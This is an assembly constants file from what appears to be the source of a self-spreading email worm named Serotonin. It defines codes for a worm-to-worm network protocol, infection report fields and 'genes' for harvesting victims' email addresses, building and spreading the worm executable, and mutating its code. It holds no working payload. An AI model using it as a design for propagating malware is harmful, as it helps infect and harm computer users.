;Constants used in Serotonin project
;------------------------------------



; �Ĵ Wormnet protocol constants ����������������������������������������������������

WORMNET_SENDKEY			equ	0	;worm is sending its public key
WORMNET_SENDGENOTYPE		equ	1	;worm is sending its genotype
WORMNET_SENDMANIFEST		equ	2	;worm is sending its manifest (genotype + stored IPs)
WORMNET_SENDREPORT		equ	3	;worm is sending the report
WORMNET_SENDGENOTYPEONLY	equ	4	;worm is sending ONLY genotype (no manifest & report)
WORMNET_DISCONNECT		equ	5	;worm is disconnecting



; �Ĵ Manifest structure constants ��������������������������������������������������

MAN_IPSPTR			equ	0	;pointer to IPs storage
MAN_IPSNUM			equ	4	;number of IPs in storage
MAN_GENSIZE			equ	8	;size of genotype



; �Ĵ Report structure constants ����������������������������������������������������

REP_MAILNUM			equ	0	;number of infected e-mails
REP_IPSNUM			equ	4	;number of IPs in storage



; �Ĵ Type constants of genz ��������������������������������������������������������

GEN_INITWORM			equ	0	;initialization gen
GEN_FINDVICTIMS			equ	1	;gen searching for email addresses
GEN_FINDWORM			equ	2	;gen searching for another worm in the net
GEN_CREATEWORM			equ	3	;gen creating the worm executable file
GEN_SPREADWORM			equ	4	;gen spreading the worm over the net
GEN_PAIRGENOTYPES		equ	5	;gen pairing two genotypes
GEN_MUTATEGENOTYPE		equ	6	;gen mutating paired genotype
GEN_CUSTOM			equ	7	;custom function gen

GEN_COUNTOFGENS			equ	8	;count of gen types
GEN_SIZEOFGEN			equ	9	;size of one gen header (type, rva, size)